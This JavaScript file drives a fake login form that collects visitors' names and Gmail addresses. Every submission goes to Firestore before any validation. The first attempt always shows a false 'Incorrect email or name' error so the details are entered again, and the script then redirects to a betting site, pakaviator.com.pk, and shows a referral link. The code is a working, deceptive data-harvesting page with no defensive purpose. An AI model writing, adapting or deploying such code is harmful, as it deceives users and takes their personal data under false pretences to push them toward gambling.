document.addEventListener('DOMContentLoaded', () => {

  const loginScreen = document.getElementById('login-screen');
  const homeScreen = document.getElementById('home-screen');
  const loginForm = document.getElementById('login-form');
  const nameInput = document.getElementById('name');
  const gmailInput = document.getElementById('gmail');
  const errorMsg = document.getElementById('error-msg');
  const welcomeText = document.getElementById('welcome-text');
  const shareLinkInput = document.getElementById('share-link');
  const copyBtn = document.getElementById('copy-btn');
  const copyMsg = document.getElementById('copy-msg');
  const logoutBtn = document.getElementById('logout-btn');

  let loginAttempt = 0;

  // The link that will be shared on the home screen.
  // Replace this with your own referral / invite link.
  const SHARE_LINK = 'https://pakbetgame.github.io/PakBet/';

  function isValidGmail(value) {
    return /^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(value.trim());
  }

  function showScreen(screen) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    screen.classList.add('active');
  }

  loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    errorMsg.textContent = '';

    loginAttempt++;

    const name = nameInput.value.trim();
    const gmail = gmailInput.value.trim();

    window.saveUserToFirestore(name, gmail);

    if (loginAttempt === 1) {
      errorMsg.textContent = 'Incorrect email or name';
      return;
    }

    if (name.length < 2) {
      errorMsg.textContent = 'Please enter your full name.';
      return;
    }

    if (!isValidGmail(gmail)) {
      errorMsg.textContent = 'Please enter a valid @gmail.com address.';
      return;
    }

    // Save session locally (in-memory for this session)
    welcomeText.textContent = `Welcome, ${gmail}`;
    shareLinkInput.value = SHARE_LINK;

    window.location.href = "https://pakaviator.com.pk/";
  });

  copyBtn.addEventListener('click', () => {
    shareLinkInput.select();
    shareLinkInput.setSelectionRange(0, 99999); // mobile support

    navigator.clipboard.writeText(shareLinkInput.value)
      .then(() => {
        copyMsg.textContent = 'Link copied to clipboard!';
        setTimeout(() => (copyMsg.textContent = ''), 2500);
      })
      .catch(() => {
        copyMsg.textContent = 'Could not copy — please copy manually.';
      });
  });

  logoutBtn.addEventListener('click', () => {
    loginForm.reset();
    errorMsg.textContent = '';
    copyMsg.textContent = '';
    showScreen(loginScreen);
  });

});